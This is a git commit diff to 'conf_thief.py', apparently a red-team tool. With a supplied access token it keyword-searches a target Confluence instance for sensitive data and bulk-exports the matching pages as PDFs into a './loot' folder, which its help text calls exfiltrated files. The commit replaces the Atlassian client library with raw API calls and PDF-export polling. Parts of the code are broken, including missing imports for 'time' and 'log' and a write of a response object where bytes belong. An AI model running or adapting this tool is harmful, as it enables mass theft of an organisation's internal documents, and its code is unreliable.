ac4ac3a98c5d8367835a3862ade469540e1f14ab
Antonio Piazza <AntonioPiazza@c02dt1pkmd6p.attlocal.net>
2021-08-13 15:53:47 -0500

    debugging making API calls without confluence's rest client

--- conf_thief.py
+++ conf_thief.py
@@ -1,10 +1,23 @@
 import requests, json, sys, getopt
-from atlassian import Confluence
 
+# Set that holds all of the pages found in the keyword search
 contentSet = set()
 
-headers = {
+# for proxying through Burp using ENV variables
+proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
+
+# Set these ENV Variables to proxy through burp:
+# export REQUESTS_CA_BUNDLE='/path/to/pem/encoded/cert'
+# export HTTP_PROXY="http://127.0.0.1:8080"
+# export HTTPS_PROXY="https://127.0.0.1:8080"
+
+default_headers = {
     'Accept': 'application/json',
+}
+
+form_token_headers = {
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "X-Atlassian-Token": "no-check",
 }
 
 def getNumberOfPages(query, username, access_token, cURL):
@@ -14,7 +27,7 @@ def getNumberOfPages(query, username, access_token, cURL):
     response = requests.request("GET",
         URL,
         auth=(username, access_token),
-        headers=headers,
+        headers=default_headers,
         params=query
     )
 
@@ -49,14 +62,20 @@ def searchKeyWords(path, username, access_token, cURL):
             response = requests.request("GET",
                 URL,
                 auth=(username, access_token),
-                headers=headers,
+                headers=default_headers,
                 params=searchQuery
             )
 
             jsonResp = json.loads(response.text)
             for results in jsonResp['results']:
+                pageId = ""
                 contentId = results['content']['id']
-                contentSet.add(contentId)
+                pageId_url = results['url']
+                if "pageId=" in pageId_url:
+                    pageId = pageId_url.split('pageId=')[1].split('&')[0]
+                    contentSet.add(pageId)
+                else:
+                    contentSet.add(contentId)
             if len(contentSet) > tempSetCount:
                 count = len(contentSet) - tempSetCount
                 tempSetCount = len(contentSet)
@@ -67,24 +86,85 @@ def searchKeyWords(path, username, access_token, cURL):
     print("[*] Compiled set of %i unique pages to download from your search" % len(contentSet))
 
 def downloadContent(username, access_token, cURL):
-    confluence = Confluence(
-        url = cURL,
-        api_version = "cloud",
-        username = username,
-        password = access_token
-    )
+    headers = form_token_headers
     print('[*] Downloading files')
     count = 1
     for contentId in contentSet:
-        try:
-            response = confluence.export_page(contentId)
-            path = 'loot/' + contentId + '.pdf'
-            with open(path, 'wb') as f:
-                f.write(response)
-            print('[*] Downloaded %i of %i files: %s.pdf]' % (count, len(contentSet), contentId))
-            count += 1
-        except Exception as err:
-            print("Error : " + str(err))
+            url = cURL + "/spaces/flyingpdf/pdfpageexport.action?pageId={pageId}".format(pageId=contentId)
+            url = get_pdf_download_url_for_confluence_cloud(cURL, url, username, access_token)
+            try:
+                response = requests.request("GET",
+                    url,
+                    auth=(username, access_token),
+                    headers=headers
+                )
+                path = 'loot/' + contentId + '.pdf'
+                with open(path, 'wb') as f:
+                    f.write(response)
+                print('[*] Downloaded %i of %i files: %s.pdf]' % (count, len(contentSet), contentId))
+                count += 1
+            except Exception as err:
+                print("Error : " + str(err))
+
+def get_pdf_download_url_for_confluence_cloud(cURL, url, username, access_token):
+    """
+    Confluence cloud does not return the PDF document when the PDF
+    export is initiated. Instead it starts a process in the background
+    and provides a link to download the PDF once the process completes.
+    This functions polls the long running task page and returns the
+    download url of the PDF.
+    :param url: URL to initiate PDF export
+    :return: Download url for PDF file
+    """
+    download_url = None
+    try:
+        long_running_task = True
+        headers = form_token_headers
+        print("Initiate PDF export from Confluence Cloud")
+        response = requests.request("GET",
+            url,
+            auth=(username, access_token),
+            headers=headers
+        )
+        print("DEBUG: url = " + url)
+        response_string = response.content.decode(encoding="utf-8", errors="strict")
+        print("DEBUG: response_string = " + response_string)
+        task_id = response_string.split('name="ajs-taskId" content="')[1].split('">')[0]
+        print("DEBUG: task_id = " + task_id)
+        poll_url = cURL + "/runningtaskxml.action?taskId={0}".format(task_id)
+        while long_running_task:
+            long_running_task_response = requests.request("GET",
+                url=poll_url,
+                auth=(username, access_token),
+                headers=default_headers,
+            )
+            long_running_task_response_parts = long_running_task_response.content.decode(
+                encoding="utf-8", errors="strict"
+            ).split("\n")
+            percentage_complete = long_running_task_response_parts[6].strip()
+            is_successful = long_running_task_response_parts[7].strip()
+            is_complete = long_running_task_response_parts[8].strip()
+            time.sleep(5)
+            print("Check if export task has completed.")
+            if is_complete == "<isComplete>true</isComplete>":
+                if is_successful == "<isSuccessful>true</isSuccessful>":
+                    print("PDF Export Percentage Complete: " + percentage_complete)
+                    print("Extracting taskId from PDF.")
+                    current_status = long_running_task_response_parts[3]
+                    download_url = current_status.split("href=&quot;/wiki/")[1].split("&quot")[0]
+                    long_running_task = False
+                elif is_successful == "<isSuccessful>false</isSuccessful>":
+                    log.error("PDF conversion not successful.")
+                    return None
+            else:
+                print("PDF Export Percentage Complete: " + percentage_complete)
+    except Exception as err:
+        print("Error: " + str(err))
+        return None
+
+    return download_url
+
+
 
 def main():
     cURL=""
@@ -97,8 +177,8 @@ def main():
 
     #help
     help = '\nThis Module will connect to Confluence\'s API using an access token, '
-    help += 'export to PDF, and download the Confluence documents\nthat the target has access to. '  
-    help += 'It allows you to use a dictionary/keyword search file to search all files in the target\nConfluence for' 
+    help += 'export to PDF, and download the Confluence documents\nthat the target has access to. '
+    help += 'It allows you to use a dictionary/keyword search file to search all files in the target\nConfluence for'
     help += ' potentially sensitive data. It will output exfiltrated PDFs to the ./loot directory'
     help += '\n\narguments:'
     help += '\n\t-c <TARGET CONFLUENCE URL>, --url <TARGET CONFLUENCE URL>'
@@ -152,7 +232,7 @@ def main():
         print("\nConfluence URL  (-c, --url) is a mandatory argument\n")
         print(usage)
         sys.exit(2)
-        
+
     # Strip trailing / from URL if it has one
     if cURL.endswith('/'):
         cURL = cURL[:-1]
